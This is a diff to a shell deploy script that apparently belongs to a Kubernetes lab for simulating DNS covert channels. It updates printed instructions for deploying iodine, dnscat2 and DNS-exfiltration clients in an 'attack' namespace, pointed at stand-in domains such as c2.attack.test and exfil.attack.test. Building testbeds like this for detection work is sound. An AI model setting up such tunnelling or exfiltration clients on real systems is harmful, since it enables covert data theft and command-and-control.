@@ -53,6 +53,7 @@ case "${1:-}" in
     echo "=== Waiting for service to get ClusterIP ==="
     sleep 2
     show_coredns_instructions
+    echo "Clients run in namespace 'attack'. From attack/ (parent of servers/): ./deploy.sh ns  then  ./deploy.sh iodine|dnscat2|exfil"
     ;;
 
   iodine)
@@ -64,9 +65,11 @@ case "${1:-}" in
     echo "Iodine server deploying. Wait for pod to be ready:"
     echo "  kubectl get pods -n $NS -w"
     echo ""
-    echo "Then deploy client:"
-    echo "  kubectl set env deployment/iodine-client ATTACK_DOMAIN=t.attack.test -n attack"
-    echo "  kubectl rollout restart deployment/iodine-client -n attack"
+    echo "Then from attack/ directory (parent of servers/):"
+    echo "  1) Create namespace and deploy client:  cd .. && ./deploy.sh ns && ./deploy.sh iodine"
+    echo "  2) Set domain and restart client:"
+    echo "     kubectl set env deployment/iodine-client ATTACK_DOMAIN=t.attack.test -n attack"
+    echo "     kubectl rollout restart deployment/iodine-client -n attack"
     ;;
 
   dnscat2)
@@ -78,9 +81,11 @@ case "${1:-}" in
     echo "dnscat2 server deploying (gem install takes 1-2 min). Wait for pod:"
     echo "  kubectl get pods -n $NS -w"
     echo ""
-    echo "Then deploy client:"
-    echo "  kubectl set env deployment/dnscat2-client ATTACK_DOMAIN=c2.attack.test -n attack"
-    echo "  kubectl rollout restart deployment/dnscat2-client -n attack"
+    echo "Then from attack/ directory (parent of servers/):"
+    echo "  1) Create namespace and deploy client:  cd .. && ./deploy.sh ns && ./deploy.sh dnscat2"
+    echo "  2) Set domain and restart client:"
+    echo "     kubectl set env deployment/dnscat2-client ATTACK_DOMAIN=c2.attack.test -n attack"
+    echo "     kubectl rollout restart deployment/dnscat2-client -n attack"
     ;;
 
   exfil)
@@ -92,9 +97,11 @@ case "${1:-}" in
     echo "Exfil receiver deploying. Wait for pod:"
     echo "  kubectl get pods -n $NS -w"
     echo ""
-    echo "Then deploy client:"
-    echo "  kubectl set env deployment/dnsexfiltrator-client EXFIL_DOMAIN=exfil.attack.test -n attack"
-    echo "  kubectl rollout restart deployment/dnsexfiltrator-client -n attack"
+    echo "Then from attack/ directory (parent of servers/):"
+    echo "  1) Create namespace and deploy client:  cd .. && ./deploy.sh ns && ./deploy.sh exfil"
+    echo "  2) Set domain and restart client:"
+    echo "     kubectl set env deployment/dnsexfiltrator-client EXFIL_DOMAIN=exfil.attack.test -n attack"
+    echo "     kubectl rollout restart deployment/dnsexfiltrator-client -n attack"
     ;;
 
   stop)
